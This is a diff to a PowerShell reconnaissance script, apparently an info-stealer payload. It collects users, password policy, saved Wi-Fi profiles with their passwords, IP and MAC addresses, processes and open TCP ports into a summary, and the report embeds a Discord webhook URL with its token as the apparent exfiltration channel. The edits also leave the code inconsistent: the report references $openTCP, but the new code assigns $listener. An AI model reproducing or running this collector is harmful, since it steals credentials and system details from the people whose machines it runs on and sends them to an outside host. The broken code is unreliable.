@@ -68,13 +68,19 @@ $RamCapacity=(Get-WmiObject Win32_PhysicalMemory | Measure-Object -Property capa
 $Ram = (Get-WmiObject Win32_PhysicalMemory | select DeviceLocator, @{Name="Capacity";Expression={ "{0:N1} GB" -f ($_.Capacity / 1GB)}}, ConfiguredClockSpeed, ConfiguredVoltage | Format-Table  | Out-String).Trim()
 $COMsrldvc = Get-WmiObject Win32_SerialPort | Select-Object DeviceID, Description
 $OSinfo = Get-CimInstance -ClassName Win32_OperatingSystem
-$OpenTCP = Get-NetTCPConnection
-$OpenTcpstring = $OpenTcpstring = (
-    $OpenTCP | ForEach-Object {
-        "LocalAddress: $($_.LocalAddress), LocalPort: $($_.LocalPort), RemoteAddress: $($_.RemoteAddress), RemotePort: $($_.RemotePort), State: $($_.State)"
+$listener = Get-NetTCPConnection | select @{Name="LocalAddress";Expression={$_.LocalAddress + ":" + $_.LocalPort}}, @{Name="RemoteAddress";Expression={$_.RemoteAddress + ":" + $_.RemotePort}}, State, AppliedSetting, OwningProcess
+$listener = $listener | foreach-object {
+    $listenerItem = $_
+    $processItem = ($process | where { [int]$_.Handle -like [int]$listenerItem.OwningProcess })
+    new-object PSObject -property @{
+      "LocalAddress" = $listenerItem.LocalAddress
+      "RemoteAddress" = $listenerItem.RemoteAddress
+      "State" = $listenerItem.State
+      "AppliedSetting" = $listenerItem.AppliedSetting
+      "OwningProcess" = $listenerItem.OwningProcess
+      "ProcessName" = $processItem.ProcessName
     }
-) -join "`n"
-
+} | select LocalAddress, RemoteAddress, State, AppliedSetting, OwningProcess, ProcessName | Sort-Object LocalAddress | Format-Table | Out-String -width 250 
 #########################################################
 #Tree
 $tree = tree /a /f
@@ -84,26 +90,25 @@ $process = Get-WmiObject win32_process | select Handle, ProcessName, ExecutableP
 $reconsummary = @"
 Powershell version is:
 $psv
-###################################################################
+--------------------------------------------------------------------
 
 Users:
 $userGroupsstring
-####################################################################
-
+--------------------------------------------------------------------
 
 Stuff about login and password (ex: when it was last reset miumum and maximum):
 $password
-###################################################################
+--------------------------------------------------------------------
 
 
 Nearby Wifi:
 $nbwifi
 
-###################################################################
+--------------------------------------------------------------------
 
 Wifi profiles:
 $wifipswrd
-###################################################################
+--------------------------------------------------------------------
 
 
 Public IP:
@@ -114,16 +119,16 @@ $localIP
 
 Mac address:
 $Mac
-###################################################################
+--------------------------------------------------------------------
 
 
 Startup folder:
 $startupstring
 
-###################################################################
+--------------------------------------------------------------------
 Important sys info:
 $basicsysinfo
-###################################################################
+--------------------------------------------------------------------
 
 
 Motherboard:
@@ -132,24 +137,24 @@ $board
 Ram info:
 $RamCapacity
 $Ram
-###################################################################
+--------------------------------------------------------------------
 
 
 COM and Serial devices:
 $COMsrldvc
-###################################################################
+--------------------------------------------------------------------
 
 
 OS info:
 $OSinfo
-##################################################################
+--------------------------------------------------------------------
 #https://discord.com/api/webhooks/1367319520418467910/1sSKW35i7Qqah4PznlpvluRoa9gqom-qPH7-Ur9Mq0EfdumYH8uJdjLuyE3EAUcUIXRN
 
 All current processes:
 $process
-
+--------------------------------------------------------------------
 Open Tcp ports:
-$openTCPstring
+$openTCP
 
 "@ 
 ## Set temp folder path
